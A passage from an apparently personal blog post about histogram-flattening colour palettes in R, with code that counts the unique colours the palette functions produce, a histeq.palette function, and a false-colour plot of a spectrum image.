src="data:image/gif;base64,R0lGODdhqAAXAPMAAP///9XV1crKyr+/v7W1tampqW5ubmFhYVRUVEZGRjg4OCgoKBgYGAAAAAAAAAAAACwAAAAAqAAXAAAE/xDISau9OOtdQ/tNwI1kaZ5oqqLNIA3NKs90bVseKGLx1N/AoHDYev00guNwyWx6NsdeCAMTNK9YoGeXKQJgkq3lc8hKvGPXBb38ID4UMlwmnuSmEsGh8ebWKw1WMmAUd1x7IHMAiIkTjCB2OhSEkR9cFAUJDApqEgVKKoEUSS5VLwkKCAQVSRetK2SFoq+vnj21AJ95R7oApF+iALGRVrg+BQgLZT6CdHgSBwgTBgYSBgcDSZd1P8YpP38+fnjP3OM70dPVPpGXODEDCpxhzyvGisJnaveCRdo0P9hcCNdu4DN8UXx0wiDmgDJ67r41u5AuH7tRPQzVCPjJ0pqJce5AMstQ8cwxSRZexZvn7Uyil/gsZkCwzAuli1BgvlzjaFY9AAQhGow4gWacnsV+CmvmsEywGaAwCrqjNOpGhROMtfRldSvXiQE7GfuzculVhkq7tMFpMiQPkWfgAv0ZEFCHeg4XSDv7jqhaIiPZyhzzty/huEcxVojHYNkanY0S391h9XBOyDHbcs2qpLLnoZpl1sIFo4CFAwkWyni6y3ToDF6hxnHxT7Ll263ZRqF9sAEiVpVR3HsUPDAQORlR2rbLYwxxl7/nejQjy2+JoNSzayfBOkXs7eDDC1WBXbz58OU3pD/PPvsTFtbbh48AADsAAAAAAAAAAAA=" />, which is the total number of colours you can express in R using <code>#RRGGBB</code> notation (not counting transparency channel which is not used and would take 256 times more) it's still too much because none of the continuous palette functions manage to fit the entire (three-dimensional) <span class="caps">RGB </span>space into one linear range of values. In fact, palette functions stop producing unique colours after a few thousands, and most don't even reach that much:</p>



<pre>
<span style="color:#000000">&gt;</span> <span style="color:#000000; font-weight:bold">for</span><span style="color:#000000">(</span>i <span style="color:#000000; font-weight:bold">in</span> <span style="color:#000000">(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">1</span><span style="color:#000000">):(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">3</span><span style="color:#000000">))</span> <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span><span style="color:#010181">length</span><span style="color:#000000">(</span><span style="color:#010181">unique</span><span style="color:#000000">(</span><span style="color:#010181">rainbow</span><span style="color:#000000">(</span>i<span style="color:#000000">))) !=</span> i<span style="color:#000000">) {</span><span style="color:#010181">print</span><span style="color:#000000">(</span>i<span style="color:#000000">);</span> <span style="color:#000000; font-weight:bold">break</span><span style="color:#000000">}</span>
<span style="color:#000000">[</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span> <span style="color:#b07e00">1531</span>
<span style="color:#000000">&gt;</span> <span style="color:#000000; font-weight:bold">for</span><span style="color:#000000">(</span>i <span style="color:#000000; font-weight:bold">in</span> <span style="color:#000000">(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">1</span><span style="color:#000000">):(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">3</span><span style="color:#000000">))</span> <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span><span style="color:#010181">length</span><span style="color:#000000">(</span><span style="color:#010181">unique</span><span style="color:#000000">(</span>topo<span style="color:#000000">.</span><span style="color:#010181">colors</span><span style="color:#000000">(</span>i<span style="color:#000000">))) !=</span> i<span style="color:#000000">) {</span><span style="color:#010181">print</span><span style="color:#000000">(</span>i<span style="color:#000000">);</span> <span style="color:#000000; font-weight:bold">break</span><span style="color:#000000">}</span>
<span style="color:#000000">[</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span> <span style="color:#b07e00">543</span>
<span style="color:#000000">&gt;</span> <span style="color:#000000; font-weight:bold">for</span><span style="color:#000000">(</span>i <span style="color:#000000; font-weight:bold">in</span> <span style="color:#000000">(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">1</span><span style="color:#000000">):(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">3</span><span style="color:#000000">))</span> <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span><span style="color:#010181">length</span><span style="color:#000000">(</span><span style="color:#010181">unique</span><span style="color:#000000">(</span><span style="color:#010181">cubeHelix</span><span style="color:#000000">(</span>i<span style="color:#000000">))) !=</span> i<span style="color:#000000">) {</span><span style="color:#010181">print</span><span style="color:#000000">(</span>i<span style="color:#000000">);</span> <span style="color:#000000; font-weight:bold">break</span><span style="color:#000000">}</span>
<span style="color:#000000">[</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span> <span style="color:#b07e00">356</span>
<span style="color:#000000">&gt;</span> f <span style="color:#000000">&lt;-</span> <span style="color:#010181">colorRampPalette</span><span style="color:#000000">(</span><span style="color:#010181">palette</span><span style="color:#000000">())</span>
<span style="color:#000000">&gt;</span> <span style="color:#000000; font-weight:bold">for</span><span style="color:#000000">(</span>i <span style="color:#000000; font-weight:bold">in</span> <span style="color:#000000">(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">1</span><span style="color:#000000">):(</span><span style="color:#b07e00">256</span>^<span style="color:#b07e00">3</span><span style="color:#000000">))</span> <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span><span style="color:#010181">length</span><span style="color:#000000">(</span><span style="color:#010181">unique</span><span style="color:#000000">(</span><span style="color:#010181">f</span><span style="color:#000000">(</span>i<span style="color:#000000">))) !=</span> i<span style="color:#000000">) {</span><span style="color:#010181">print</span><span style="color:#000000">(</span>i<span style="color:#000000">);</span> <span style="color:#000000; font-weight:bold">break</span><span style="color:#000000">}</span>
<span style="color:#000000">[</span><span style="color:#b07e00">1</span><span style="color:#000000">]</span> <span style="color:#b07e00">621</span>
</pre>



<p>So let's limit our number of colours to a nice and modest value of 2048 but leave that as a parameter. Now that we know our N, calculating the indices is fairly simple: <img src="data:image/gif;base64,R0lGODdhqAATAPMAAP///93d3dXV1crKyr+/v7W1tampqW5ubmFhYVRUVEZGRjg4OCgoKBgYGAAAAAAAACwAAAAAqAATAAAE/xDISau9OOvNheNg6IXk5QjSqX1l63IOO3no69J2ieN572MyAE9CCP4oQ0AsEaPEEM1QcaZKHq+voGPgdCA2RtLWYlA0FgSKIbzyUgYsOHaepdac4JdVaUgwvhNjLUE7KnSHIDJyFmx4LotIHwQLaBJ7MBWCgimGOQ4HBZ9cljGdUUoyn6Exd0Kla4GjmXkYHqClNZt2AAh/pK0hRouQcLCZpcjIFkwFByweXHB3m0FMXFOk0W4pQLQWHn1ji2yLk5WQJWGpsdg9DmlOsotDWvBKsY73Jt6ZKO+MJmT1+qJLDEBu8X6omwUggIMAgfLpm4iQokRUyBQkq7AnzBBzSsFkcUpW6uLEIOg8HYzY8CHLiicZWnzZLUPHb514MWCQwMZCmO9SkiS5Ep+EeaYkphK5bt8KMFxGwDxqZFIDQC5+UnSwRmQdjuJMpYGTwN6/FPCgASALr+DUorHIrjUlsogBCwgU2BtUYRihUz6hGPHAKlKMZiy8JIZC5bAzqscEZ2BDGHFOSE8Az82ieGkKr4hC28wZTA9p0b9cAUPNOiHfLKBR+21NG+fq0JcQFbpdm3XuQ7+x7O5NnEpvqagNkY4AADsAAAAAAAAAAAA=" />, and there we have our histogram-flattening palette transformation function:</p>



<pre>
histeq<span style="color:#000000">.</span>palette <span style="color:#000000">&lt;-</span> <span style="color:#000000; font-weight:bold">function</span><span style="color:#000000">(</span>x<span style="color:#000000">,</span> pal<span style="color:#000000">,</span> max<span style="color:#000000">.</span>col<span style="color:#000000">=</span><span style="color:#b07e00">2048</span><span style="color:#000000">, ...) {</span>
	<span style="color:#000000; font-weight:bold">function</span><span style="color:#000000">(</span>n<span style="color:#000000">) {</span>
		<span style="color:#838183; font-style:italic"># palette is assumed to be linear; we're transforming its scale from linear to CDF-shaped</span>
		grid <span style="color:#000000">&lt;-</span> <span style="color:#010181">seq</span><span style="color:#000000">(</span>from<span style="color:#000000">=</span><span style="color:#010181">min</span><span style="color:#000000">(</span>x<span style="color:#000000">),</span> to<span style="color:#000000">=</span><span style="color:#010181">max</span><span style="color:#000000">(</span>x<span style="color:#000000">),</span> length<span style="color:#000000">.</span>out<span style="color:#000000">=</span>n<span style="color:#000000">)</span>
		coords <span style="color:#000000">&lt;-</span> <span style="color:#010181">ecdf</span><span style="color:#000000">(</span>x<span style="color:#000000">)(</span>grid<span style="color:#000000">)</span>

		<span style="color:#838183; font-style:italic"># so, coords[zeroes+1] - coords[zeroes] == 0</span>
		zeroes <span style="color:#000000">&lt;-</span> <span style="color:#010181">which</span><span style="color:#000000">(</span><span style="color:#010181">diff</span><span style="color:#000000">(</span>coords<span style="color:#000000">) ==</span> <span style="color:#b07e00">0</span><span style="color:#000000">)</span>
		<span style="color:#838183; font-style:italic"># ECDF is right-continuous, so the last point is always bigger than second-to-last</span>
		<span style="color:#838183; font-style:italic"># but we can still have problems at the first point, which we shouldn't try to extrapolate</span>
		zeroes<span style="color:#000000">[</span>zeroes<span style="color:#000000">==</span><span style="color:#b07e00">1</span><span style="color:#000000">] &lt;-</span> <span style="color:#b07e00">2</span> <span style="color:#838183; font-style:italic"># if coords[2] == coords[1], interpolate second, not first</span>
		<span style="color:#838183; font-style:italic"># replace points where diff=0 with linear interpolation</span>
		coords<span style="color:#000000">[</span>zeroes<span style="color:#000000">] &lt;-</span> <span style="color:#010181">approx</span><span style="color:#000000">(</span>grid<span style="color:#000000">[-</span>zeroes<span style="color:#000000">],</span> coords<span style="color:#000000">[-</span>zeroes<span style="color:#000000">],</span> grid<span style="color:#000000">[</span>zeroes<span style="color:#000000">])</span>$y

		<span style="color:#838183; font-style:italic"># now that every coordinate is different, we know how many colors to request</span>
		<span style="color:#838183; font-style:italic"># so that every index would be different, too</span>
		<span style="color:#838183; font-style:italic"># but don't request too many colours because they won't be unique anyway</span>
		n<span style="color:#000000">.</span>pal <span style="color:#000000">&lt;-</span> <span style="color:#010181">ceiling</span><span style="color:#000000">(</span><span style="color:#010181">min</span><span style="color:#000000">(</span>max<span style="color:#000000">.</span>col<span style="color:#000000">,</span> <span style="color:#b07e00">1</span><span style="color:#000000">/</span><span style="color:#010181">min</span><span style="color:#000000">(</span><span style="color:#010181">diff</span><span style="color:#000000">(</span>coords<span style="color:#000000">))))</span>
		<span style="color:#010181">pal</span><span style="color:#000000">(</span>n<span style="color:#000000">.</span>pal<span style="color:#000000">, ...)[</span><span style="color:#010181">round</span><span style="color:#000000">(</span><span style="color:#b07e00">1</span><span style="color:#000000">+</span>coords<span style="color:#000000">*(</span>n<span style="color:#000000">.</span>pal<span style="color:#000000">-</span><span style="color:#b07e00">1</span><span style="color:#000000">))]</span>
	<span style="color:#000000">}</span>
<span style="color:#000000">}</span>
</pre>



<p>Let's feed a scientific image and a false-color palette to this palette-transforming function:</p>



<pre>
<span style="color:#010181">require</span><span style="color:#000000">(</span>fields<span style="color:#000000">)</span> <span style="color:#838183; font-style:italic"># image.plot produces a colour bar with the plot</span>
image<span style="color:#000000">.</span><span style="color:#010181">plot</span><span style="color:#000000">(</span>spectrum<span style="color:#000000">,</span> col<span style="color:#000000">=</span>topo<span style="color:#000000">.</span><span style="color:#010181">colors</span><span style="color:#000000">(</span><span style="color:#b07e00">512</span><span style="color:#000000">))</span>
image<span style="color:#000000">.</span><span style="color:#010181">plot</span><span style="color:#000000">(</span>spectrum<span style="color:#000000">,</span> col<span style="color:#000000">=</span>histeq<span style="color:#000000">.</span><span style="color:#010181">palette</span><span style="color:#000000">(</span>spectrum<span style="color:#000000">,</span> topo<span style="color:#000000">.</span>colors<span style="color:#000000">)(</span><span style="color:#b07e00">512</span><span style="color:#000000">))</span>
</pre>



<p><img src="wavy_spectrum.png" alt="" class="center" /></p>

<p>Most of the image was background, so our signal is whitened out. Instead, we see that some kind of wavy pattern covers all the image, invisible unless you highlight just the right part of the dynamic range. This is actually bad because it could interfere with shape of weak signals, but at least now we know that. (It's definitely impossible to see just from looking at original 16-bit image.)</p>

<p>Try histogram flattening on your own data to see if there's any patterns lurking in the middle of the bell curve!</p>

<!-- TODO: maybe I should have used breaks= argument of image() function -->

<p class="footnote" id="fn1"><sup>1</sup> This is the opposite of what you usually see on false-color images: the most different values are ones at the far end of the bell curve of the distribution.</p>

<p class="footnote" id="fn2"><sup>2</sup> But see <code>zlim=c(min,max)</code> argument of <code>image(...)</code> function.</p>
				</div>
			</content>
		</entry>

</feed>
